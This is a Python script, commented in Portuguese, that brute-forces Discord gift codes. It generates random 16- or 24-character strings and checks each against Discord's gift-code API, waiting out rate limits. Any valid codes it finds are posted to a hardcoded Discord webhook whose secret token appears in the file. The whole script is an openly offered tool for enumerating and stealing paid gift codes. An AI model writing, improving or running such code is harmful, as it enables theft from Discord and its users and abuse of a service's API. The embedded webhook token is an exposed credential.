import requests
import random
import string
import time

# Função para enviar a mensagem com o link do código gerado para o Webhook do Discord
def send_webhook(webhook_url, message):
    payload = {"content": message}  # A mensagem será o link do código gerado
    try:
        print(f"Enviando para o Webhook: {message}")  # Log para depuração
        response = requests.post(webhook_url, json=payload)
        if response.status_code == 204:
            print(f"Mensagem enviada com sucesso!")  # Sucesso ao enviar
        else:
            print(f"Erro ao enviar mensagem para o webhook. Status Code: {response.status_code}")  # Erro ao enviar
    except Exception as e:
        print(f"Erro ao enviar mensagem para o webhook: {e}")  # Caso ocorra algum erro ao enviar

# Função principal de geração de códigos
class SapphireGen:
    def __init__(self, code_type: str, codes: int, webhook_url: str):
        self.type = code_type
        self.codes = codes
        self.session = requests.Session()
        self.webhook_url = webhook_url

    def generate(self):
        valid_codes = 0
        generated_codes = set()

        while valid_codes < self.codes:
            try:
                # Gerar código aleatório (24 caracteres para "boost", 16 para "classic")
                code = "".join(
                    random.choices(string.ascii_letters + string.digits, k=24 if self.type == "boost" else 16)
                )

                # Verificar se o código foi gerado antes
                if code in generated_codes:
                    continue
                generated_codes.add(code)

                # Validar o código
                print(f"Verificando o código: {code}")  # Log para depuração

                req = self.session.get(
                    f"https://discordapp.com/api/entitlements/gift-codes/{code}",
                    timeout=10,
                )

                # Se o código for válido (status 200), envia para o Webhook
                if req.status_code == 200:
                    print(f"Código válido encontrado: discord.gift/{code}")  # Para depuração
                    send_webhook(self.webhook_url, f"discord.gift/{code}")  # Envia o link para o Webhook
                    valid_codes += 1
                elif req.status_code == 429:
                    print(f"Rate limit atingido, aguardando...")  # Quando rate limit for atingido
                    time.sleep(2)
                else:
                    print(f"Código inválido (status {req.status_code}): discord.gift/{code}")  # Caso o código seja inválido

            except Exception as e:
                print(f"Erro ao gerar o código ou ao fazer requisição: {e}")  # Caso ocorra algum erro

if __name__ == "__main__":
    # URL do Webhook do Discord
    webhook_url = "https://discord.com/api/webhooks/1346085542026149949/xdN-GdWGAtUOgUXIWeLnRyl4FVpz3OMhxV0V1bM3ujIXVZb_tedcPlj-4HDCgvwHVHxg"

    # Tipo de código ("boost" ou "classic")
    code_type = "boost"  # Pode ser "boost" ou "classic"

    # Quantidade de códigos válidos a serem gerados
    codes_to_generate = 10  # Modifique o número conforme necessário

    # Passando os parâmetros para a classe SapphireGen
    SapphireGen(code_type, codes_to_generate, webhook_url).generate()
